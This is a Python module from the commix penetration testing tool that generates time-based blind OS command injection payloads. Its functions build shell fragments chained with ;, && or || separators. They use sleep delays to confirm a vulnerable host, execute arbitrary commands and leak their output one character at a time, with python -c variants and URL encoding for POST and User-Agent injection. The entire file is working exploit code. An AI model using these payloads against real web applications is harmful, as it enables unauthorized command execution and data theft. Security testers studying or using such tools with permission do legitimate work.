#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import urllib
from src.utils import settings
"""
  The "time-based" injection technique on Blind OS Command Injection.
  The available "time-based" payloads.
"""

#----------------------------------------------------------------
# Time-based decision payload (check if host is vulnerable).
#----------------------------------------------------------------
def decision(separator, TAG, output_length, delay, http_request_method):
  if separator == ";" :
    payload = (separator + " "
               "str=$(echo "+TAG+")" + separator + " "
               # Find the length of the output.
               "str1=${#str}" + separator + " "
               "if [ " + str(output_length) + " -ne ${str1} ]" + separator  + " "
               "then sleep 0" + separator + " "
               "else sleep " + str(delay) + separator + " "
               "fi "
               )
    
  elif separator == "&&" :
    if http_request_method == "POST":
      separator = urllib.quote(separator)
      ampersand = urllib.quote("&")
    else:
      ampersand = "&"
    payload = (ampersand + " " +
               "sleep 0  " + separator + " "
               "str=$(echo "+TAG+") " + separator + " "
               # Find the length of the output.
               "str1=${#str} " + separator + " "
               "[ " + str(output_length) + " -eq ${str1} ] " + separator + " "
               "sleep " + str(delay) + " "
               )
    if http_request_method == "POST":
      separator = urllib.unquote(separator)

  elif separator == "||" :
    payload = ("| " +
               "[ "+str(output_length)+" -ne $(echo "+TAG+" | tr -d '\\n' | wc -c) ] " + separator + " "
               "sleep " + str(delay) + " "
               )  
  else:
    pass
  
  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_shell(separator, TAG, output_length, delay, http_request_method):

  if separator == ";" :
    payload = (separator + " "
               # Find the length of the output, using readline().
               "str1=$(python -c \"print len(\'" + TAG + "\')\")"+ separator + " "
               "if [ " + str(output_length) + " -ne ${str1} ]" + separator  + " "
               "then $(python -c \"import time\ntime.sleep(0)\")"+ separator + " "
               "else $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"+ separator + " "
               "fi "
               )

  elif separator == "&&" :
    if http_request_method == "POST":
      separator = urllib.quote(separator)
      ampersand = urllib.quote("&")
    else:
      ampersand = "&"
    payload = (ampersand + " " +
               "$(python -c \"import time\ntime.sleep(0)\") " + separator + " "
               # Find the length of the output, using readline().
               "str1=$(python -c \"print len(\'" + TAG + "\')\")"+ separator + " "
               "[ " + str(output_length) + " -eq ${str1} ] " + separator + " "
               "$(python -c \"import time\ntime.sleep("+ str(delay) +")\") "
               )
    if http_request_method == "POST":
      separator = urllib.unquote(separator)

  elif separator == "||" :
    payload = ("| " +
               # Find the length of the output, using readline().
               "[ " + str(output_length) + " -ne $(python -c \"print len(\'" + TAG + "\')\") ] " + separator + " "
               "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
               ) 
  else:
    pass

  # New line fixation
  if settings.USER_AGENT_INJECTION == True:
    payload = payload.replace("\n","%0d")

  return payload

#-----------------------------------------------
# Execute shell commands on vulnerable host.
#-----------------------------------------------
def cmd_execution(separator, cmd, output_length, delay, http_request_method):
  if separator == ";" :
    payload = (separator + " "
               "str=$(" + cmd + ")" + separator + " "
               "str1=${#str}" + separator + " "
               "if [ " + str(output_length) + " != ${str1} ]" + separator + " "
               "then sleep 0" + separator + " "
               "else sleep " + str(delay) + separator + " "
               "fi "
               )
               
  if separator == "&&" :
    if http_request_method == "POST":
      separator = urllib.quote(separator)
      ampersand = urllib.quote("&")
    else:
      ampersand = "&"
    payload = (ampersand + " " +
               "sleep 0  " + separator + " "
               "str=$(" + cmd + ")  " + separator + " "
               # Find the length of the output.
               "str1=${#str}  " + separator + " "
               "[ " + str(output_length) + " -eq ${str1} ] " + separator + " "
               "sleep " + str(delay) + " "
               )
    if http_request_method == "POST":
      separator = urllib.unquote(separator)
      
  if separator == "||" :
    payload = ("| " +
               "[ "+str(output_length)+" -ne $(echo -n $(" + cmd + ") | tr -d '\\n' | wc -c) ] " + separator + " " 
               "sleep " + str(delay) + " "
               )
  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_shell(separator, cmd, output_length, delay, http_request_method):

  if separator == ";" :
    payload = (separator + " "
               # Find the length of the output, using readline().
               "str1=$(python -c \"print len(\'$(echo $("+cmd+"))\')\")"+ separator + " "
               "if [ " + str(output_length) + " -ne ${str1} ]" + separator  + " "
               "then $(python -c \"import time\ntime.sleep(0)\")"+ separator + " "
               "else $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"+ separator + " "
               "fi "
               )

  elif separator == "&&" :
    if http_request_method == "POST":
      separator = urllib.quote(separator)
      ampersand = urllib.quote("&")
    else:
      ampersand = "&"
    payload = (ampersand + " " +
               "$(python -c \"import time\ntime.sleep(0)\") " + separator + " "
               # Find the length of the output, using readline().
               "str1=$(python -c \"print len(\'$(echo $("+cmd+"))\')\")"+ separator + " "
               "[ " + str(output_length) + " -eq ${str1} ] " + separator + " "
               "$(python -c \"import time\ntime.sleep("+ str(delay) +")\") "
               )
    if http_request_method == "POST":
      separator = urllib.unquote(separator)

  elif separator == "||" :
    payload = ("| " +
               # Find the length of the output, using readline().
               "[ " + str(output_length) + " -ne $(python -c \"print len(\'$(echo $("+cmd+"))\')\") ] " + separator + " "
               "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
               ) 
  else:
    pass

  # New line fixation
  if settings.USER_AGENT_INJECTION == True:
    payload = payload.replace("\n","%0d")

  return payload


#---------------------------------------------------
# Get the execution output, of shell execution.
#---------------------------------------------------
def get_char(separator, cmd, num_of_chars, ascii_char, delay, http_request_method):
  if separator == ";" :
    payload = (separator + " "
               "str=$(" + cmd + "|tr '\\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2)" + separator +
               "if [ " + str(ascii_char) + " != ${str} ]" + separator +
               "then sleep 0" + separator +
               "else sleep " + str(delay) + separator +
               "fi "
               )

  if separator == "&&" :
    if http_request_method == "POST":
      separator = urllib.quote(separator)
      ampersand = urllib.quote("&")
    else:
      ampersand = "&"
    payload = (ampersand + " " +
               "sleep 0  " + separator + " "
               "str=$(" + cmd + "|tr '\\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) " + separator + " "
               "[ " + str(ascii_char) + " -eq ${str} ] " + separator + " "
               "sleep " + str(delay) + " "
               )
    if http_request_method == "POST":
      separator = urllib.unquote(separator)

  if separator == "||" :
    payload = ("| "
               "[ " + str(ascii_char) + " -ne  $(" + cmd + "|tr '\\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) ] " + separator + 
               "sleep " + str(delay) + " "
               )	
    
  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, delay, http_request_method):
  
  if separator == ";" :
    payload = (separator + " "
               "str=$(python -c \"print ord(\'$(echo $("+cmd+"))\'["+str(num_of_chars-1)+":"+str(num_of_chars)+"])\nexit(0)\")" + separator +
               "if [ " + str(ascii_char) + " != ${str} ]" + separator +
               "then $(python -c \"import time\ntime.sleep(0)\")"+ separator + " "
               "else $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"+ separator + " "
               "fi "
               )
    
  elif separator == "&&" :
    if http_request_method == "POST":
      separator = urllib.quote(separator)
      ampersand = "%26"
    else:
      ampersand = "&"
    payload = (ampersand + " " +
               "$(python -c \"import time\ntime.sleep(0)\") " +  separator + " "
               "str=$(python -c \"print ord(\'$(echo $("+cmd+"))\'["+str(num_of_chars-1)+":"+str(num_of_chars)+"])\nexit(0)\")" + separator + " "
               "[ " + str(ascii_char) + " -eq ${str} ] " +  separator + " "
               "$(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
               )
    if http_request_method == "POST":
      separator = urllib.unquote(separator)

  elif separator == "||" :
    payload = ("| " +
               "[ " + str(ascii_char) + " -ne  $(python -c \"print ord(\'$(echo $("+cmd+"))\'["+str(num_of_chars-1)+":"+str(num_of_chars)+"])\nexit(0)\") ] " + separator + 
               "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
               )
    
  else:
    pass

  # New line fixation
  if settings.USER_AGENT_INJECTION == True:
    payload = payload.replace("\n","%0d")

  return payload
  
#---------------------------------------------------
# Get the execution output, of shell execution.
#---------------------------------------------------
def fp_result(separator, cmd, num_of_chars, ascii_char, delay, http_request_method):
  if separator == ";" :
    payload = (separator + " "
               "str=$(" + cmd + ")" + separator + " "
               "if [ " + str(ascii_char) + " != ${str} ]" + separator + " "
               "then sleep 0" + separator + " "
               "else sleep " + str(delay) + separator + " "
               "fi "
               )

  if separator == "&&" :
    if http_request_method == "POST":
      separator = urllib.quote(separator)
      ampersand = urllib.quote("&")
    else:
      ampersand = "&"
    payload = (ampersand + " " +
               "sleep 0  " + separator + " "
               "str=$(" + cmd + ") " + separator + " "
               "[ " + str(ascii_char) + " -eq ${str} ] " + separator + " "
               "sleep " + str(delay) + " "
               )
    if http_request_method == "POST":
      separator = urllib.unquote(separator)

  if separator == "||" :
    payload = ("| " +
               "[ " + str(ascii_char) + " -ne  $(" + cmd + ") ] " + separator + 
               "sleep " + str(delay) + " "
               )  
    
  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, delay, http_request_method):
  
  if separator == ";" :
    payload = (separator + " "
               "str=$(python -c \"print $(echo $("+cmd+"))\n\")" + separator +
               "if [ " + str(ascii_char) + " != ${str} ]" + separator +
               "then $(python -c \"import time\ntime.sleep(0)\")"+ separator + " "
               "else $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"+ separator + " "
               "fi "
               )
    
  elif separator == "&&" :
    if http_request_method == "POST":
      separator = urllib.quote(separator)
      ampersand = "%26"
    else:
      ampersand = "&"
    payload = (ampersand + " " +
               "$(python -c \"import time\ntime.sleep(0)\") " +  separator + " "
               "str=$(python -c \"print $(echo $("+cmd+"))\n\")" + separator + " "
               "[ " + str(ascii_char) + " -eq ${str} ] " +  separator + " "
               "$(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
               )
    if http_request_method == "POST":
      separator = urllib.unquote(separator)

  elif separator == "||" :
    payload = ("| " +
               "[ " + str(ascii_char) + " -ne $(python -c \"print $(echo $("+cmd+"))\n\") ] " + separator + 
               "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
               )
    
  else:
    pass

  # New line fixation
  if settings.USER_AGENT_INJECTION == True:
    payload = payload.replace("\n","%0d")

  return payload